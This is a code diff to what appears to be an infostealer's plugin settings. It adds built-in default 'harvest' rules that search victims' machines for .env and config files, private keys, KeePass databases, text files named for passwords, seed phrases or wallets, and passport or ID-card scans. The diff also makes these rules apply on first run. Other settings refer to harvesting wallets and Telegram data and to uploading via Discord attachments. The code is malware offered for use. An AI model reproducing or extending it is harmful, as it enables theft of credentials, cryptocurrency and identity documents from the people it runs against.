@@ -317,8 +317,33 @@ let pluginSettings = {
   harvest_extensions: false,
   harvest_wallets: false,
   harvest_telegram: false,
-  harvest_file_rules: [],
+  /** Default common file-scan rules (extension / name contains / dir / fullUpload). */
+  harvest_file_rules: [
+    { extension: ".env", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: "", nameContains: "config.json", dirPath: "", fullUpload: false },
+    { extension: ".pem", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".key", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".kdbx", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".ppk", nameContains: "", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "password", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "seed", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "wallet", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "mnemonic", dirPath: "", fullUpload: false },
+    { extension: ".txt", nameContains: "recovery", dirPath: "", fullUpload: false },
+    { extension: ".pdf", nameContains: "passport", dirPath: "", fullUpload: false },
+    { extension: ".pdf", nameContains: "id card", dirPath: "", fullUpload: false },
+    { extension: ".pdf", nameContains: "invoice", dirPath: "", fullUpload: false },
+    { extension: ".jpg", nameContains: "passport", dirPath: "", fullUpload: false },
+    { extension: ".png", nameContains: "passport", dirPath: "", fullUpload: false },
+    { extension: ".jpg", nameContains: "id", dirPath: "", fullUpload: false },
+    { extension: ".png", nameContains: "wallet", dirPath: "", fullUpload: false },
+    { extension: "", nameContains: "secret", dirPath: "", fullUpload: false },
+    { extension: "", nameContains: "credential", dirPath: "", fullUpload: false },
+  ],
 };
+
+/** Shared default rules if DB has empty harvest_file_rules. */
+const DEFAULT_HARVEST_FILE_RULES = pluginSettings.harvest_file_rules.slice();
 
 /**
  * Hard max per Discord attachment. Non-boosted guilds are often 8 MiB;
@@ -440,11 +465,17 @@ function loadSettings(db) {
       else if (r.key === 'harvest_file_rules') {
         try {
           const parsed = JSON.parse(r.value || '[]');
-          pluginSettings.harvest_file_rules = Array.isArray(parsed) ? parsed : [];
+          pluginSettings.harvest_file_rules = Array.isArray(parsed) && parsed.length
+            ? parsed
+            : DEFAULT_HARVEST_FILE_RULES.slice();
         } catch {
-          pluginSettings.harvest_file_rules = [];
+          pluginSettings.harvest_file_rules = DEFAULT_HARVEST_FILE_RULES.slice();
         }
       }
+    }
+    // First run / no key yet → keep built-in common rules
+    if (!rows.some((r) => r.key === "harvest_file_rules")) {
+      pluginSettings.harvest_file_rules = DEFAULT_HARVEST_FILE_RULES.slice();
     }
   } catch (_) {}
 }
